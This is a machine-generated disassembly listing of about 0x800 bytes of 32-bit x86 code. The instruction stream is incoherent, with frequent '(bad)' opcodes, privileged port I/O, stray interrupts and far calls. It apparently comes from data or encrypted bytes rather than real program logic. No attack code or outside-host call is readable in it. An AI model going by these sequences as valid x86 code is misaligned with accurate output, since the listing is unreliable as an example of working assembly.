  404c8c:	in     al,dx
  404c8d:	jle    0x404ccd
  404c8f:	xor    edi,DWORD PTR [ecx+0x5]
  404c92:	dec    eax
  404c93:	rcl    BYTE PTR [ebp+0x76faf03d],cl
  404c99:	cwde   
  404c9a:	jecxz  0x404d02
  404c9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c9d:	push   ecx
  404c9e:	cmp    eax,0x27499ee2
  404ca3:	push   esp
  404ca4:	sub    eax,0x89b328f8
  404ca9:	mov    bl,0x30
  404cab:	idiv   BYTE PTR [esi]
  404cad:	mov    bh,0xcd
  404caf:	sub    DWORD PTR [ebx],0x77
  404cb2:	das    
  404cb3:	cdq    
  404cb4:	or     eax,0x33ed097d
  404cb9:	mov    ah,0x4d
  404cbb:	push   ecx
  404cbc:	inc    edx
  404cbd:	xchg   edi,eax
  404cbe:	setnp  al
  404cc1:	and    BYTE PTR [esp+esi*1-0x25284222],al
  404cc8:	int    0xeb
  404cca:	(bad)  
  404ccb:	not    dl
  404ccd:	mov    edx,0xf21fe382
  404cd2:	into   
  404cd3:	xor    edi,0x20e96137
  404cd9:	cli    
  404cda:	ds mov dh,dh
  404cdd:	popa   
  404cde:	mov    ds:0x9c952f3e,eax
  404ce3:	aad    0x96
  404ce5:	sub    dh,BYTE PTR [ebp+eiz*4-0x3609add2]
  404cec:	sbb    al,0x5d
  404cee:	repnz retf 
  404cf0:	mov    edi,0x42885454
  404cf5:	and    eax,0xa4e46401
  404cfa:	test   al,0xb1
  404cfc:	cmp    eax,0x9e2f0959
  404d01:	mov    bl,0xb8
  404d03:	int    0xa1
  404d05:	cmp    bh,bl
  404d07:	out    dx,eax
  404d08:	sahf   
  404d09:	fs fcomp st(1)
  404d0c:	lods   al,BYTE PTR ds:[esi]
  404d0d:	push   ss
  404d0e:	or     DWORD PTR [ebx],0x9afe5ac5
  404d14:	adc    bl,BYTE PTR [edi-0x37]
  404d17:	ins    DWORD PTR es:[edi],dx
  404d18:	fsubr  st(2),st
  404d1a:	pop    edi
  404d1b:	xchg   DWORD PTR [eax],ecx
  404d1d:	std    
  404d1e:	push   esi
  404d1f:	aam    0x44
  404d21:	inc    esi
  404d22:	mov    cl,0x31
  404d24:	mov    dh,0x7e
  404d26:	mov    ds:0x5a8f6a09,eax
  404d2b:	je     0x404d7e
  404d2d:	outs   dx,DWORD PTR ds:[esi]
  404d2e:	xlat   BYTE PTR ds:[ebx]
  404d2f:	sub    BYTE PTR [eax+0x6a39cc17],ah
  404d35:	arpl   WORD PTR [edx-0x1ccf8fff],bx
  404d3b:	xor    al,0xf
  404d3d:	ins    BYTE PTR es:[edi],dx
  404d3e:	and    BYTE PTR [eax+0x5b],dh
  404d41:	inc    esi
  404d42:	push   eax
  404d43:	inc    esp
  404d44:	test   BYTE PTR [edi+0x7e],bh
  404d47:	call   0x8218:0xa6aca5d8
  404d4e:	mov    ch,0x5a
  404d50:	add    DWORD PTR [edi],edi
  404d52:	dec    edx
  404d53:	mov    bh,0x55
  404d55:	idiv   DWORD PTR [edx+0x5b]
  404d58:	cmp    ebp,edx
  404d5a:	mov    cl,BYTE PTR [esi]
  404d5c:	pushf  
  404d5d:	iret   
  404d5e:	repnz adc eax,0x3458aa16
  404d64:	stos   BYTE PTR es:[edi],al
  404d65:	fld    QWORD PTR [edi+ebx*4+0x33]
  404d69:	cmp    al,0x86
  404d6b:	push   ss
  404d6c:	xlat   BYTE PTR ds:[ebx]
  404d6d:	pushf  
  404d6e:	mov    ds:0x477ddeca,eax
  404d73:	jb     0x404d89
  404d75:	js     0x404d8e
  404d77:	rol    BYTE PTR [eax],cl
  404d79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d7a:	fstp   st(1)
  404d7c:	mov    ch,0x16
  404d7e:	sti    
  404d7f:	pop    ebp
  404d80:	xor    ebx,0x8653ede5
  404d86:	out    dx,eax
  404d87:	(bad)  
  404d88:	aam    0x93
  404d8a:	push   eax
  404d8b:	cdq    
  404d8c:	cmc    
  404d8d:	int    0x77
  404d8f:	repz and ebx,0x72bff884
  404d96:	dec    esi
  404d97:	jmp    0x7706849b
  404d9c:	pop    esp
  404d9d:	test   dh,ah
  404d9f:	adc    cl,BYTE PTR [edi]
  404da1:	pop    ebp
  404da2:	bound  esi,QWORD PTR [esi]
  404da4:	jno    0x404d7f
  404da6:	inc    esp
  404da7:	mov    DWORD PTR [ebx-0x4b06d952],ebp
  404dad:	daa    
  404dae:	inc    esp
  404daf:	bound  esp,QWORD PTR [edx]
  404db1:	push   0xfffffff1
  404db3:	cmp    BYTE PTR [edi+0x5a],cl
  404db6:	repz push esi
  404db8:	(bad)  
  404db9:	fcom   DWORD PTR [ebp+0x120ed0d0]
  404dbf:	mov    edx,0x3950cd95
  404dc4:	fsubr  DWORD PTR [ebx+0x7e742850]
  404dca:	dec    esi
  404dcb:	in     eax,dx
  404dcc:	test   BYTE PTR [esi-0x374561d3],dl
  404dd2:	jns    0x404d82
  404dd4:	in     al,0x3
  404dd6:	inc    eax
  404dd7:	push   es
  404dd8:	cdq    
  404dd9:	xor    eax,0x5da970b7
  404dde:	cdq    
  404ddf:	je     0x404e22
  404de1:	jns    0x404e5d
  404de3:	xor    al,0xdd
  404de5:	cld    
  404de6:	fs push ecx
  404de8:	dec    edx
  404de9:	sbb    al,0x8c
  404deb:	out    0xa7,eax
  404ded:	mov    ch,0xb
  404def:	jl     0x404de3
  404df1:	das    
  404df2:	cmp    eax,0x84d3e6c9
  404df7:	xchg   edi,eax
  404df8:	scas   al,BYTE PTR es:[edi]
  404df9:	sub    eax,0xc142cbd9
  404dfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404dff:	cmc    
  404e00:	jns    0x404d9a
  404e02:	jmp    0x404e28
  404e04:	push   esi
  404e05:	sbb    DWORD PTR [ebx+0x27],edi
  404e08:	not    DWORD PTR fs:[ebx]
  404e0b:	adc    BYTE PTR [eax+0x4a716fb6],bl
  404e11:	jnp    0x404e2d
  404e13:	push   ebx
  404e14:	test   cl,ah
  404e16:	ss lock sub al,0x2f
  404e1a:	add    dh,BYTE PTR [ecx]
  404e1c:	pop    ds
  404e1d:	daa    
  404e1e:	into   
  404e1f:	rcl    DWORD PTR ds:0x18170caf,0xb
  404e26:	test   eax,0x42ba5454
  404e2b:	loopne 0x404e65
  404e2d:	fst    DWORD PTR ds:0x20ef21d8
  404e33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e34:	retf   
  404e35:	mov    eax,DWORD PTR [eax+0x5e]
  404e38:	mov    eax,ds:0x79565b5
  404e3d:	lea    ebx,[ecx+0x2b619e3]
  404e43:	sub    eax,0xa47665fc
  404e48:	ret    
  404e49:	loopne 0x404df0
  404e4b:	xchg   edi,eax
  404e4c:	lahf   
  404e4d:	xor    ah,0x35
  404e50:	cmc    
  404e51:	jp     0x404e3e
  404e53:	mov    ah,0x62
  404e55:	cmp    bh,BYTE PTR [ebp-0x4a561338]
  404e5b:	jbe    0x404e1c
  404e5d:	jns    0x404ed5
  404e5f:	inc    ebp
  404e60:	xchg   ebp,eax
  404e61:	mov    ah,0x82
  404e63:	mov    eax,ds:0xeb5d515c
  404e68:	imul   esp,DWORD PTR [ebp+0x1a1a0e4f],0x6
  404e6f:	sbb    eax,DWORD PTR [eax]
  404e71:	paddd  mm6,QWORD PTR [esi-0x54c9658a]
  404e78:	aad    0xfc
  404e7a:	fwait
  404e7b:	in     al,dx
  404e7c:	add    BYTE PTR [edi],0x76
  404e7f:	pop    ecx
  404e80:	adc    al,BYTE PTR [eax+edi*2]
  404e83:	mov    al,ds:0xbba29c60
  404e88:	js     0x404e28
  404e8a:	and    DWORD PTR [esi+eiz*8],0xb3bace97
  404e91:	or     ebx,DWORD PTR [esp+ecx*8]
  404e94:	fs dec ecx
  404e96:	inc    ebx
  404e97:	sub    DWORD PTR [ebp-0x65a16ae5],ebx
  404e9d:	xchg   edx,eax
  404e9e:	jnp    0x404ecb
  404ea0:	rcr    BYTE PTR [esi],1
  404ea2:	in     al,0x4b
  404ea4:	push   edi
  404ea5:	or     eax,0x2b4d8520
  404eaa:	sub    ah,bh
  404eac:	mov    ecx,edx
  404eae:	sti    
  404eaf:	call   0xa275:0xf6960022
  404eb6:	out    0xd5,eax
  404eb8:	cmp    DWORD PTR [edi],0xffffff85
  404ebb:	test   DWORD PTR [ecx-0x5257bd97],eax
  404ec1:	rol    DWORD PTR ds:[ebx+ecx*8-0x56],0x5a
  404ec7:	and    cl,BYTE PTR [ebp-0x38a025ec]
  404ecd:	cld    
  404ece:	add    eax,edx
  404ed0:	fnstsw WORD PTR [ecx+0x59]
  404ed3:	ja     0x404e66
  404ed5:	shr    BYTE PTR [esi-0x29],cl
  404ed8:	scas   al,BYTE PTR es:[edi]
  404ed9:	cmp    BYTE PTR [esi+0x3ec34eb5],ch
  404edf:	sbb    bl,0x35
  404ee2:	hlt    
  404ee3:	test   eax,0x58fda132
  404ee8:	push   0x346af964
  404eed:	sub    BYTE PTR [ebp+0x5e5683bc],0xb5
  404ef4:	scas   eax,DWORD PTR es:[edi]
  404ef5:	inc    edi
  404ef6:	pop    es
  404ef7:	daa    
  404ef8:	jl     0x404eb5
  404efa:	repz scas al,BYTE PTR es:[edi]
  404efc:	jmp    0x404e8f
  404efe:	pushf  
  404eff:	outs   dx,BYTE PTR ds:[esi]
  404f00:	ds mov esi,0x9ff5fb7d
  404f06:	aam    0x5f
  404f08:	pop    esp
  404f09:	hlt    
  404f0a:	lds    ebx,FWORD PTR [eax]
  404f0c:	repnz aaa 
  404f0e:	adc    edx,esp
  404f10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f11:	sub    dl,dl
  404f13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f14:	(bad)  
  404f15:	aam    0x42
  404f17:	xchg   BYTE PTR [edi-0x525fb567],cl
  404f1d:	aaa    
  404f1e:	pop    es
  404f1f:	jp     0x404f88
  404f21:	mov    ds:0x13f2a6cb,al
  404f26:	nop
  404f27:	mov    al,ds:0x6c96802c
  404f2c:	mov    edi,0x63d0d99c
  404f31:	dec    edx
  404f32:	sub    al,0x39
  404f34:	inc    ebx
  404f35:	repz (bad) 
  404f37:	mov    ecx,0x482d7e4f
  404f3c:	xor    BYTE PTR [ebx],ch
  404f3e:	iret   
  404f3f:	lock mov ebx,0xedd3fd20
  404f45:	outs   dx,DWORD PTR ds:[esi]
  404f46:	mov    ebx,0x4e0ef9a9
  404f4b:	xchg   edi,eax
  404f4c:	in     al,0xed
  404f4e:	add    eax,ebx
  404f50:	mov    bl,BYTE PTR [ebx+0x76]
  404f53:	es call 0x5c58afeb
  404f59:	xor    ebx,ecx
  404f5b:	mov    ds:0x8996f04b,al
  404f60:	dec    ebx
  404f61:	dec    ebp
  404f62:	dec    ebp
  404f63:	and    dl,BYTE PTR [ebp+0x6ba8be88]
  404f69:	popa   
  404f6a:	das    
  404f6b:	nop
  404f6c:	loop   0x404f89
  404f6e:	outs   dx,DWORD PTR ds:[esi]
  404f6f:	in     eax,dx
  404f70:	add    BYTE PTR [esi-0x41a19545],bh
  404f76:	sbb    cl,dl
  404f78:	dec    eax
  404f79:	arpl   WORD PTR [edi+ebp*1-0x7fc9c0c3],bp
  404f80:	test   al,0xc6
  404f82:	stos   BYTE PTR es:[edi],al
  404f83:	mov    bl,0xa7
  404f85:	sub    bl,bl
  404f87:	jge    0x405000
  404f89:	inc    ebp
  404f8a:	sub    cl,ah
  404f8c:	mov    bh,0xc3
  404f8e:	xchg   ebp,eax
  404f8f:	enter  0xc24a,0x44
  404f93:	int    0x86
  404f95:	sub    eax,0x21129ecf
  404f9a:	ret    0x8a35
  404f9d:	rcl    BYTE PTR [ebx-0x389a03d3],0x67
  404fa4:	pop    ebp
  404fa5:	push   ds
  404fa6:	xchg   ebx,eax
  404fa7:	int    0xba
  404fa9:	retf   
  404faa:	pop    esi
  404fab:	repz and al,0xb3
  404fae:	xor    BYTE PTR [edi+0x42],bl
  404fb1:	es cmp eax,0x94e13d8c
  404fb7:	inc    ebp
  404fb8:	retf   
  404fb9:	jle    0x405018
  404fbb:	inc    esi
  404fbc:	dec    esi
  404fbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fbe:	add    edi,ebp
  404fc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404fc1:	pop    DWORD PTR [edx]
  404fc3:	fild   DWORD PTR [eax]
  404fc5:	pop    es
  404fc6:	pop    edi
  404fc7:	(bad)  [edi-0x7f]
  404fca:	scas   al,BYTE PTR es:[edi]
  404fcb:	adc    eax,0x8e50aa18
  404fd0:	xchg   BYTE PTR [edi-0x5424fecc],dl
  404fd6:	dec    ebp
  404fd7:	sbb    eax,edx
  404fd9:	arpl   dx,sp
  404fdb:	add    eax,0x9bf8f029
  404fe0:	jmp    0x96b2808b
  404fe5:	clc    
  404fe6:	push   es
  404fe7:	xor    DWORD PTR [ebx+0x69],esp
  404fea:	pop    esp
  404feb:	add    bl,dl
  404fed:	jbe    0x404f75
  404fef:	stos   DWORD PTR es:[edi],eax
  404ff0:	(bad)  [edx+0x75]
  404ff3:	sbb    eax,0x802af398
  404ff8:	jl     0x404faf
  404ffa:	imul   esi,DWORD PTR [edx],0xbf9954dd
  405000:	xchg   BYTE PTR [edx],ah
  405002:	mov    BYTE PTR [ecx],dl
  405004:	adc    eax,0x6d75dd07
  405009:	jecxz  0x405027
  40500b:	sbb    eax,0xc5a7a496
  405010:	sbb    eax,0x5cc7a81
  405015:	pop    edi
  405016:	lahf   
  405017:	mov    dl,0x56
  405019:	outs   dx,DWORD PTR ds:[esi]
  40501a:	les    eax,FWORD PTR [edx+0x6d]
  40501d:	aam    0xb
  40501f:	retf   
  405020:	add    DWORD PTR [ecx+0x5c],esi
  405023:	mov    ds:0xc0c88cef,al
  405028:	and    BYTE PTR [esi+0x5141816f],dl
  40502e:	mov    eax,ds:0xd9a04097
  405033:	mov    al,bl
  405035:	or     DWORD PTR [edx-0x670ce687],edi
  40503b:	rcr    BYTE PTR [ebx+0x1e],1
  40503e:	adc    eax,0x38cec430
  405043:	rcr    BYTE PTR [edi-0x73],1
  405046:	and    BYTE PTR [ebx],cl
  405048:	addr16 jbe 0x405012
  40504b:	jno    0x405023
  40504d:	in     eax,dx
  40504e:	push   0x2b1ed827
  405053:	lock fwait
  405055:	arpl   WORD PTR [ecx-0x77665b5f],di
  40505b:	jmp    0x72ef00ba
  405060:	data16 loop 0x4050af
  405063:	push   ss
  405064:	sub    DWORD PTR [ecx],ecx
  405066:	iret   
  405067:	clc    
  405068:	ss xchg edi,eax
  40506a:	lea    eax,[esi-0x32]
  40506d:	aaa    
  40506e:	std    
  40506f:	daa    
  405070:	push   edx
  405071:	xchg   ecx,eax
  405072:	test   eax,0xf20eefe3
  405077:	aas    
  405078:	(bad)
  40507c:	retf   0xbcc8
  40507f:	ss mov ecx,0xdc67f3f
  405085:	mov    ebp,0x431c7c5
  40508a:	sub    bl,BYTE PTR [ebx]
  40508c:	add    eax,edx
  40508e:	aam    0xb4
  405090:	and    BYTE PTR [ebp+0x15a16283],ch
  405096:	clc    
  405097:	jp     0x40502d
  405099:	das    
  40509a:	pop    ebx
  40509b:	icebp  
  40509c:	push   ecx
  40509d:	pop    cx
  40509f:	in     eax,dx
  4050a0:	nop
  4050a1:	jle    0x4050f9
  4050a3:	daa    
  4050a4:	jb     0x405067
  4050a6:	pop    ds
  4050a7:	mov    dh,0x66
  4050a9:	imul   ecx,DWORD PTR [ebp+0x4c804021],0x53
  4050b0:	(bad)  [ebx]
  4050b2:	jne    0x4050b5
  4050b4:	repnz xchg ebx,eax
  4050b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050b7:	mov    ch,0x0
  4050b9:	hlt    
  4050ba:	loop   0x405119
  4050bc:	lds    edx,FWORD PTR [edx]
  4050be:	ret    
  4050bf:	jp     0x40506a
  4050c1:	jg     0x40504d
  4050c3:	(bad)  
  4050c5:	and    edi,DWORD PTR [edx]
  4050c7:	add    eax,0x898370e7
  4050cc:	mov    ds:0x252989ca,al
  4050d1:	hlt    
  4050d2:	mov    ah,0x91
  4050d4:	sar    DWORD PTR [esi+0x7cae71e5],cl
  4050da:	dec    ecx
  4050db:	and    DWORD PTR [edx],ecx
  4050dd:	jmp    0x2c1fab9a
  4050e2:	jecxz  0x40513c
  4050e4:	cmp    edx,ebp
  4050e6:	pop    ecx
  4050e7:	(bad)  
  4050e8:	lea    eax,ds:0xe3d005ff
  4050ee:	push   edx
  4050ef:	add    DWORD PTR [eax+0x7df33460],edx
  4050f5:	not    esp
  4050f7:	mov    bh,BYTE PTR [eax+0x415bd3b5]
  4050fd:	and    eax,0x616dc1fb
  405102:	shl    BYTE PTR [esi],0x21
  405105:	pop    ds
  405106:	jnp    0x40516b
  405108:	xor    esp,DWORD PTR [ebx]
  40510a:	jp     0x40517b
  40510c:	repz add al,0xaa
  40510f:	cwde   
  405110:	cld    
  405111:	push   0x579d60eb
  405116:	and    BYTE PTR [edi+0xb],0x8
  40511a:	add    dh,ch
  40511c:	rcr    esp,cl
  40511e:	fld    TBYTE PTR [esi]
  405120:	sub    BYTE PTR [eax],dh
  405122:	cwde   
  405123:	xor    ebp,DWORD PTR ds:0xda3f53e8
  405129:	daa    
  40512a:	add    al,0x6d
  40512c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40512e:	and    BYTE PTR [ebx],cl
  405130:	retf   0xb865
  405133:	sub    esi,0xffffff80
  405136:	inc    esi
  405137:	or     al,0xb5
  405139:	fidiv  DWORD PTR [ecx+0x4f]
  40513c:	pop    ecx
  40513d:	pop    ebx
  40513e:	mov    ebp,0x4477d4d8
  405143:	push   edi
  405144:	setl   BYTE PTR [esi]
  405147:	mov    dh,0x2
  405149:	aam    0x8c
  40514b:	jo     0x40511f
  40514d:	es push edi
  40514f:	repz call 0x7839a59f
  405155:	or     ecx,edi
  405157:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405158:	push   0xffffff9d
  40515a:	xchg   ecx,eax
  40515b:	sbb    eax,0x7705b626
  405160:	cdq    
  405161:	add    al,0xb5
  405163:	lahf   
  405164:	js     0x405156
  405166:	push   edx
  405167:	into   
  405168:	sub    edx,DWORD PTR [esp+ecx*4]
  40516b:	cmp    al,0x8a
  40516d:	imul   esi,DWORD PTR [edx-0x74],0xad6ded49
  405174:	fcom   QWORD PTR [ecx-0x2a2dc3f4]
  40517a:	push   ecx
  40517b:	adc    cl,BYTE PTR [eax+0x54]
  40517e:	(bad)  [edx]
  405180:	inc    esi
  405181:	in     eax,0x2a
  405183:	ret    
  405184:	(bad)
  405187:	mov    dh,0x16
  405189:	sub    DWORD PTR [edx],esi
  40518b:	xchg   ebx,eax
  40518c:	mov    ebp,0xe394ed3e
  405191:	ror    ah,0x6
  405194:	xchg   esp,eax
  405195:	arpl   WORD PTR [eax],cx
  405197:	inc    edx
  405198:	loop   0x4051d3
  40519a:	mov    ah,0xd
  40519c:	loope  0x4051b7
  40519e:	mov    di,0x1547
  4051a2:	hlt    
  4051a3:	xor    esp,DWORD PTR [edx-0x74]
  4051a6:	mov    ah,0xcc
  4051a8:	outs   dx,BYTE PTR ds:[esi]
  4051a9:	push   edi
  4051aa:	nop
  4051ab:	lods   al,BYTE PTR ds:[esi]
  4051ac:	push   ds
  4051ad:	pop    ebx
  4051ae:	mov    edi,DWORD PTR [ebp-0x22636b3c]
  4051b4:	leave  
  4051b5:	and    DWORD PTR [ecx+0x42],ebx
  4051b8:	mov    cl,0x16
  4051ba:	and    eax,0xb0d7eb8
  4051bf:	pcmpgtd mm5,QWORD PTR [ecx+0x12]
  4051c3:	xchg   edx,eax
  4051c4:	imul   edi,DWORD PTR [ecx+0x6b0cbd32],0xffffffdd
  4051cb:	nop
  4051cc:	pop    edi
  4051cd:	push   esp
  4051ce:	xor    al,0x50
  4051d0:	lods   al,BYTE PTR ds:[esi]
  4051d1:	ror    BYTE PTR [edi+0xcf5ca4c],cl
  4051d7:	cwde   
  4051d8:	imul   edi,edi,0x5121d4fa
  4051de:	retf   
  4051df:	jmp    0x405187
  4051e1:	sub    ecx,DWORD PTR [edi]
  4051e3:	in     eax,0x3f
  4051e5:	jp     0x4051a2
  4051e7:	or     eax,0x431fa91d
  4051ec:	pushf  
  4051ed:	lods   al,BYTE PTR ds:[esi]
  4051ee:	int    0x41
  4051f0:	(bad)
  4051f3:	out    dx,eax
  4051f4:	xchg   esi,eax
  4051f5:	out    0x54,eax
  4051f7:	ins    DWORD PTR es:[edi],dx
  4051f8:	outs   dx,DWORD PTR ds:[esi]
  4051f9:	sbb    al,0xce
  4051fb:	sub    al,0xf9
  4051fd:	or     ebx,ebp
  4051ff:	(bad)  
  405201:	stos   BYTE PTR es:[edi],al
  405202:	into   
  405203:	imul   BYTE PTR [ecx]
  405205:	xchg   ah,dh
  405207:	sbb    al,0x4e
  405209:	les    edi,FWORD PTR [eax+0x5d]
  40520c:	enter  0x33a6,0x55
  405210:	sub    edx,DWORD PTR [ecx+0x3a628954]
  405216:	ss mov esi,0x6c936883
  40521c:	sbb    eax,0x554922d5
  405221:	xor    DWORD PTR [edx],esp
  405223:	(bad)  
  405224:	pop    ecx
  405225:	cmp    al,0x9e
  405227:	ins    DWORD PTR es:[edi],dx
  405228:	sub    bl,BYTE PTR [edx+0x3f]
  40522b:	and    al,dh
  40522d:	sbb    BYTE PTR ds:0xaf6b19d9,bl
  405233:	and    eax,0x67a9b687
  405238:	pop    es
  405239:	icebp  
  40523a:	aad    0xed
  40523c:	jmp    0xfdefcd0a
  405241:	call   0x59d40507
  405246:	fmul   QWORD PTR [edi+0x52]
  405249:	popf   
  40524a:	and    esp,0xd2b5ab22
  405250:	xlat   BYTE PTR ds:[ebx]
  405251:	arpl   WORD PTR [edi+eax*4],si
  405254:	push   ds
  405255:	lods   eax,DWORD PTR ds:[esi]
  405256:	popf   
  405257:	rcr    BYTE PTR [ebp+esi*8-0x73],cl
  40525b:	or     DWORD PTR ds:[edx+0x78],eax
  40525f:	mov    ?,WORD PTR [ebx+0x74]
  405262:	mov    ebx,0xa8a53b8
  405267:	sub    ebx,DWORD PTR [ecx-0x75d781a0]
  40526d:	popf   
  40526e:	add    ebp,ebx
  405270:	out    dx,al
  405271:	adc    BYTE PTR [ebx-0x7e],ch
  405274:	fs call 0x4676:0x79a2a59a
  40527c:	clc    
  40527d:	xchg   ebx,eax
  40527e:	mov    ds:0xa603fe34,al
  405283:	add    eax,0xe2fe0017
  405288:	jge    0x4052e7
  40528a:	dec    eax
  40528b:	xor    al,0xf7
  40528d:	les    eax,FWORD PTR [ecx+0x5871941b]
  405293:	iret   
  405294:	xor    edx,DWORD PTR [esi+0x76]
  405297:	cdq    
  405298:	jb     0x4052c4
  40529a:	push   0x76
  40529c:	or     al,0xb3
  40529e:	pop    es
  40529f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052a0:	fisub  WORD PTR [esi]
  4052a2:	in     al,dx
  4052a3:	pop    esp
  4052a4:	imul   ebx
  4052a6:	xor    eax,0x674bbd8d
  4052ab:	dec    ebp
  4052ac:	cmp    esi,ebp
  4052ae:	test   eax,0x55104ffd
  4052b3:	adc    eax,0x43a25e12
  4052b8:	jle    0x40532a
  4052ba:	xchg   ecx,eax
  4052bb:	out    0x60,eax
  4052bd:	or     BYTE PTR [ebp-0x35510f0],0xcd
  4052c4:	mov    bh,0x69
  4052c6:	sbb    bh,BYTE PTR [ecx]
  4052c8:	inc    ecx
  4052c9:	imul   ecx,DWORD PTR [ebx+0x39bfb596],0xe5b2011d
  4052d3:	push   0xc9e9d932
  4052d8:	push   eax
  4052d9:	pop    edx
  4052da:	xchg   edx,eax
  4052db:	sub    cl,BYTE PTR [ebx-0x2e]
  4052de:	addr16 loop 0x405354
  4052e1:	push   esp
  4052e2:	les    ebp,FWORD PTR [edi-0x3e]
  4052e5:	inc    ebx
  4052e6:	out    dx,eax
  4052e7:	mov    WORD PTR [edi+eiz*4-0x6d],ss
  4052eb:	or     DWORD PTR [edx+0x53],edx
  4052ee:	sti    
  4052ef:	cli    
  4052f0:	dec    esi
  4052f1:	and    DWORD PTR [esi-0x32],ebp
  4052f4:	lahf   
  4052f5:	add    al,0xca
  4052f7:	and    BYTE PTR [ecx-0x53],bl
  4052fa:	cmc    
  4052fb:	inc    esp
  4052fc:	int3   
  4052fd:	sbb    ebp,DWORD PTR [eax-0xd383d25]
  405303:	in     eax,dx
  405304:	jno    0x405380
  405306:	inc    ebp
  405307:	sbb    dh,BYTE PTR [ebx-0x50]
  40530a:	mov    ds:0xbeaf87a9,al
  40530f:	pushf  
  405310:	ret    
  405311:	cli    
  405312:	leave  
  405313:	pop    ss
  405314:	ret    0xc8b9
  405317:	adc    ch,BYTE PTR [ecx-0x36]
  40531a:	test   eax,0x7aca07ab
  40531f:	stos   DWORD PTR es:[edi],eax
  405320:	les    edx,FWORD PTR [esi]
  405322:	xchg   bh,al
  405324:	ds add eax,0x76c8f9e4
  40532a:	jo     0x40536c
  40532c:	adc    eax,0xa41e213
  405331:	bound  eax,QWORD PTR [ecx]
  405333:	dec    ecx
  405334:	dec    edx
  405335:	xor    bl,BYTE PTR [ebx+0x18b21dc7]
  40533b:	les    ecx,FWORD PTR ds:0xd881ee52
  405341:	call   0x75f4f073
  405346:	xor    DWORD PTR [ebp+0x4a],eax
  405349:	mov    ebp,0x9b95ae20
  40534e:	pop    ebp
  40534f:	mov    ebp,0xaf19105b
  405354:	clc    
  405355:	stos   BYTE PTR es:[edi],al
  405356:	cmc    
  405357:	xchg   ebp,eax
  405358:	sti    
  405359:	mov    ds:0xd29f4788,eax
  40535e:	dec    ecx
  40535f:	push   0x53e59608
  405364:	cwde   
  405365:	pop    edi
  405366:	sbb    eax,0xeb7e5054
  40536b:	ja     0x4052fd
  40536d:	mov    cl,0xf9
  40536f:	push   edi
  405370:	mov    dl,0x2f
  405372:	cdq    
  405373:	dec    eax
  405374:	test   BYTE PTR [esi-0x6b0d4ec0],ah
  40537a:	cmp    al,dl
  40537c:	dec    ebp
  40537d:	pop    ebx
  40537e:	or     esi,ecx
  405380:	retf   0xb9f5
  405383:	add    al,0x11
  405385:	adc    BYTE PTR [esi+0x1b],al
  405388:	jb     0x40532c
  40538a:	mov    ds:0xfef63946,al
  40538f:	mov    esp,0x2039f345
  405394:	inc    ebp
  405395:	clc    
  405396:	sbb    DWORD PTR [esi],ecx
  405398:	jl     0x40535d
  40539a:	jge    0x4053ab
  40539c:	fld    QWORD PTR [ecx+0x310568eb]
  4053a2:	(bad)  
  4053a3:	mov    eax,0x19fc5052
  4053a8:	push   eax
  4053a9:	ds mov al,0x5a
  4053ac:	or     al,0xe3
  4053ae:	(bad)  
  4053af:	jle    0x405354
  4053b1:	(bad)  
  4053b2:	sbb    al,BYTE PTR [edi+0x3d]
  4053b5:	xchg   edx,eax
  4053b6:	lods   al,BYTE PTR gs:[esi]
  4053b8:	pop    esp
  4053b9:	ja     0x405402
  4053bb:	and    eax,0x46a0498d
  4053c0:	ror    DWORD PTR [edx],1
  4053c2:	mov    cl,0xa2
  4053c4:	mov    al,0x30
  4053c6:	mov    cl,0x16
  4053c8:	push   es
  4053c9:	add    al,0xc6
  4053cb:	adc    eax,esp
  4053cd:	lds    edx,FWORD PTR [edx+eiz*4+0x6b]
  4053d1:	test   dl,dh
  4053d3:	fcom   QWORD PTR [edx-0x5b6f3a6]
  4053d9:	and    al,0xfe
  4053db:	sbb    DWORD PTR [ebx],edi
  4053dd:	push   0xdf249a2b
  4053e2:	or     eax,0xcb5232d1
  4053e7:	xlat   BYTE PTR ds:[ebx]
  4053e8:	les    ebx,FWORD PTR [edx-0x4d]
  4053eb:	ret    0xf16d
  4053ee:	or     ch,0x73
  4053f1:	sub    BYTE PTR [edx+0x76e0d48],bh
  4053f7:	sub    BYTE PTR [edi],bh
  4053f9:	out    dx,eax
  4053fa:	cwde   
  4053fb:	push   ecx
  4053fc:	stc    
  4053fd:	cwde   
  4053fe:	pop    DWORD PTR [ecx+ecx*4]
  405401:	inc    ecx
  405402:	push   ss
  405403:	ins    DWORD PTR es:[edi],dx
  405404:	inc    ebp
  405405:	pop    ss
  405406:	adc    al,BYTE PTR [ebx]
  405408:	lds    esi,FWORD PTR [edx]
  40540a:	pop    es
  40540b:	xor    al,0x6
  40540d:	mov    ah,0xf5
  40540f:	and    esi,DWORD PTR [edx+0x56]
  405412:	lods   al,BYTE PTR ds:[esi]
  405413:	jo     0x405455
  405415:	ins    BYTE PTR es:[edi],dx
  405416:	sar    DWORD PTR [ebx],cl
  405418:	and    bl,BYTE PTR [edx-0x50]
  40541b:	ins    BYTE PTR es:[edi],dx
  40541c:	pop    ss
  40541d:	fbld   TBYTE PTR [ecx+0x58]
  405420:	jo     0x4053b6
  405422:	dec    edx
  405423:	ins    BYTE PTR es:[edi],dx
  405424:	ins    BYTE PTR es:[edi],dx
  405425:	pushf  
  405426:	pop    esi
  405427:	sub    al,0x9e
  405429:	rol    ch,1
  40542b:	pop    esp
  40542c:	sbb    cl,BYTE PTR [eax-0x48]
  40542f:	fldcw  WORD PTR ss:[eax+ecx*2-0x6ee5b909]
  405437:	jle    0x40549b
  405439:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40543a:	daa    
  40543b:	mov    DWORD PTR [esi],ecx
  40543d:	(bad)  
  40543e:	dec    BYTE PTR [ebp+edx*1-0x79]
  405442:	add    al,0xe5
  405444:	adc    BYTE PTR [esi-0x7c900376],0x86
  40544b:	mov    ebp,0xda64915b
  405450:	loope  0x405492
  405452:	sub    eax,0x81749d88
